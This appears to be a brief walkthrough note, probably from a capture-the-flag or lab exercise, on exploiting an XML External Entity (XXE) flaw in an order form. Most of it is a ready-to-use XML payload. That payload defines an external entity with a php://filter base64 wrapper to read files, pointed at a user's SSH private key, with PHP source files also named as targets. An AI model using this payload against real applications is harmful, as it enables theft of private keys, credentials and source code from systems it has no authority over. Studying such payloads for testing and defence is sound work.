Identify which elements that we can control are displayed back to us, in this case is 
item
```
<?xml version = "1.0"?>
<order>
	<quantity>
		1
	</quantity>
	<item>
		&company;
	</item>
	<address>
		1
	</address>
	</order>

Try to get source code like index.php or db.php, change to : >>>>>

<?xml version = "1.0"?>
<!DOCTYPE item [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=c:/users/daniel/.ssh/id_rsa">
]>
<order>
	<quantity>
		1
	</quantity>
	<item>
		&company;
	</item>
	<address>
		1
	</address>
	</order> 
	
	```
